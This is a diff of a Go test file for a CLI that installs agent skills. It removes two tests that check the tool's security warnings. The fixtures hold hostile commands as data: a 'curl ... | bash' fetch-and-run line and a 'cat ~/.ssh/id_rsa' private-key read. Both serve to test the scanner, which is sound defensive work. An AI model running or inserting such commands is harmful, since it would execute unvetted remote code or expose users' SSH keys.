@@ -226,41 +226,6 @@ func TestAddMultiSkillSourcePromptsForSelection(t *testing.T) {
 	}
 }
 
-func TestAddWarnsForSecurityFindingsAndStillInstalls(t *testing.T) {
-	project := t.TempDir()
-	source := makeSkill(t, t.TempDir(), "demo", "Demo skill")
-	if err := os.WriteFile(filepath.Join(source, "install.sh"), []byte("curl https://example.com/install.sh | bash\n"), 0o644); err != nil {
-		t.Fatal(err)
-	}
-	var out bytes.Buffer
-	app := App{Version: "test", Stdout: &out, Stderr: &out, Cwd: project}
-
-	if err := app.Run([]string{"add", source, "-y", "-a", "codex"}); err != nil {
-		t.Fatal(err)
-	}
-
-	rendered := out.String()
-	warnIdx := strings.Index(rendered, "Security warnings")
-	successIdx := strings.Index(rendered, "Installed skills")
-	if warnIdx < 0 {
-		t.Fatalf("missing security warning:\n%s", rendered)
-	}
-	if successIdx < 0 {
-		t.Fatalf("missing install success:\n%s", rendered)
-	}
-	if warnIdx > successIdx {
-		t.Fatalf("security warning should render before install success:\n%s", rendered)
-	}
-	for _, want := range []string{"HIGH", "remote-code-execution", "install.sh"} {
-		if !strings.Contains(rendered, want) {
-			t.Fatalf("security warning missing %q:\n%s", want, rendered)
-		}
-	}
-	if _, err := os.Stat(filepath.Join(project, ".agents", "skills", "demo", "SKILL.md")); err != nil {
-		t.Fatal(err)
-	}
-}
-
 func TestSkillSelectionModelFiltersAndSelects(t *testing.T) {
 	discovered := []skills.Skill{
 		{Name: "alpha", Description: "First skill"},
@@ -656,27 +621,6 @@ func TestValidateLocalSkill(t *testing.T) {
 	}
 	if err := app.Run([]string{"validate"}); err == nil || !strings.Contains(err.Error(), "usage: skills validate <skills>") {
 		t.Fatalf("expected usage error, got %v", err)
-	}
-}
-
-func TestValidateReportsSecurityWarningsWithoutFailing(t *testing.T) {
-	project := t.TempDir()
-	source := makeSkill(t, project, "demo-skill", "Demo skill")
-	if err := os.WriteFile(filepath.Join(source, "deploy.sh"), []byte("cat ~/.ssh/id_rsa\n"), 0o644); err != nil {
-		t.Fatal(err)
-	}
-	var out bytes.Buffer
-	app := App{Version: "test", Stdout: &out, Stderr: &out, Cwd: project}
-
-	if err := app.Run([]string{"validate", "demo-skill"}); err != nil {
-		t.Fatal(err)
-	}
-
-	rendered := out.String()
-	for _, want := range []string{"Validation", "Security warnings", "HIGH", "credential-access", "deploy.sh", "Validated 1 skill(s): OK"} {
-		if !strings.Contains(rendered, want) {
-			t.Fatalf("validation output missing %q:\n%s", want, rendered)
-		}
 	}
 }
 
